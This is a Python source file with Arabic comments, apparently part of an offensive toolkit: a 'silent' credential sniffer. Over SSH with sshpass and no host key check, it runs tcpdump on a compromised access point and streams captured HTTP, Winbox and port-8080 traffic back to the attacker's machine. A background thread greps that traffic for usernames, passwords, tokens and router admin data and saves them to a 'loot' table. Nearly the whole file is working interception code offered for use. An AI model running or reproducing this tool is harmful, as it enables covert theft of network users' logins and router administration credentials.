#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import time
import re
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.append(str(BASE_DIR))

from core.system_guard import SystemGuard
from core.db_manager import DatabaseManager

SystemGuard.enforce_root_privileges("Silent SigInt & Credential Sniffer")

class SilentSigIntSniffer:
    def __init__(self, ap_ip: str, ap_password: str):
        self.ap_ip = SystemGuard.sanitize_input(ap_ip, "interface")
        self.ap_password = ap_password
        self.db_manager = DatabaseManager()
        self.sniffing_active = False
        self._initialize_loot_table()

    def _initialize_loot_table(self):
        """بناء جداول الغنائم وصيد البيانات لصفحات الإدارة والكروت والـ APIs"""
        query = """
        CREATE TABLE IF NOT EXISTS hijacked_intel_loot (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_source TEXT,
            data_category TEXT, -- HTTP_Login, WebFig_Data, API_Leak
            intercepted_payload TEXT,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        """
        import sqlite3
        with DatabaseManager._lock:
            conn = self.db_manager._get_secure_connection()
            if conn:
                try:
                    with conn: conn.cursor().execute(query)
                    print("[+] تم تهيئة جداول صيد الغنائم الحساسة (Intel Loot Table) بنجاح.")
                except sqlite3.Error: pass
                finally: conn.close()

    def read_remote_wireless_stream(self, ap_interface: str) -> subprocess.Popen:
        """قراءة تيار البيانات العاري لكرت الوايرلس عن بُعد عبر أنبوب SSH دون فتح بورتات أو إيرسيرف"""
        clean_inf = SystemGuard.sanitize_input(ap_interface, "interface")
        
        # حيلة هندسية بالغة الخطورة: تشغيل tcpdump داخل الأكسس وسحب الخام (Raw Pcap Stream) عبر الـ SSH لكالي مباشرة
        remote_tcpdump_cmd = f"tcpdump -i {clean_inf} -w - -s 0 'tcp port 80 or tcp port 8291 or tcp port 8080'"
        base_ssh_args = ["sshpass", "-p", self.ap_password, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{self.ap_ip}", remote_tcpdump_cmd]
        
        try:
            # فتح أنبوب ثنائي مستمر لقراءة المخرجات اللحظية وحظر الـ shell لـ Bandit
            process = subprocess.Popen(base_ssh_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
            return process
        except Exception:
            return None

    def start_silent_intel_harvesting(self, ap_interface: str):
        """إطلاق خيط استخباراتي صامت يمتص البيانات الحساسة ويعزلها في قاعدة البيانات"""
        self.sniffing_active = True
        threading.Thread(target=self._harvesting_worker, args=(ap_interface,), daemon=True).start()

    def _harvesting_worker(self, interface: str):
        print(f"[📡 SIGINT] بدأ جناح التجسس الصامت في امتصاص حزم البيانات اللاسلكية العابرة...")
        process = self.read_remote_wireless_stream(interface)
        if not process:
            return

        try:
            # قراءة سيل الحزم الممررة عبر الأنبوب وفحص حمولتها (Deep Packet Inspection)
            while self.sniffing_active and process.poll() is None:
                # سحب الحزم سطرًا بسطر وتحويلها لنصوص للبحث عن كلمات السر والـ APIs
                line = process.stdout.readline()
                if not line:
                    break
                
                try:
                    decoded_line = line.decode('utf-8', errors='ignore')
                    
                    # 🎮 1. اقتناص بيانات تسجيل الدخول وكلمات سر الكروت لشبكات الـ HTTP المفتوحة
                    if "user=" in decoded_line.lower() or "password=" in decoded_line.lower() or "username=" in decoded_line.lower():
                        self._save_loot_to_db("HTTP_Login", decoded_line)
                        print("[🔥 صيد ثمين] تم اعتراض واقتناص كلمات سر كروت تسجيل دخول لشبكة مفتوحة!")

                    # 🎮 2. مراقبة واقتناص بيانات صفحات الإدارة والتحكم لراوترات الميكروتيك والـ WebFig
                    if "webfig" in decoded_line.lower() or "winbox" in decoded_line.lower():
                        self._save_loot_to_db("WebFig_Data", decoded_line)
                        print("[⚠️ تنبيه] رصد محاولة اتصال أو بيانات حساسة موجهة لبورتات إدارة الـ WebFig!")

                    # 🎮 3. اقتناص بيانات بورتات الـ API لبرامج إنشاء كروت الشبكات (مثل تذاكر العبور)
                    if "api/" in decoded_line.lower() or "token" in decoded_line.lower():
                        self._save_loot_to_db("API_Leak", decoded_line)

                except Exception:
                    pass
                
        except Exception as e:
            print(f"[-] عطل في خيط رصد الحزم: {e}")
        finally:
            if process:
                process.terminate()

    def _save_loot_to_db(self, category: str, payload: str):
        """حفظ صيد الغنائم السري في الجداول المشفرة لقاعدة البيانات بالأقفال الصارمة"""
        query = "INSERT INTO hijacked_intel_loot (target_source, data_category, intercepted_payload) VALUES (?, ?, ?);"
        # اقتناص واجهة نصية نظيفة ومختصرة للبيانات الحساسة لعدم ملء قاعدة البيانات بالقمامة
        clean_payload = payload.strip()[:500] 
        import sqlite3
        with DatabaseManager._lock:
            conn = self.db_manager._get_secure_connection()
            if conn:
                try:
                    with conn: conn.cursor().execute(query, (self.ap_ip, category, clean_payload))
                except sqlite3.Error: pass
                finally: conn.close()

    def stop_silent_harvesting(self):
        self.sniffing_active = False
        print("[+] تم إغلاق جناح التجسس الصامت وكبح الأنابيب العكسية بنجاح.")

if __name__ == "__main__":
    print("[*] محرك الاعتراض والتجسس الصامت واقتناص الغنائم (Silent SigInt Sniffer) مستقل ومنفصل 100%.")
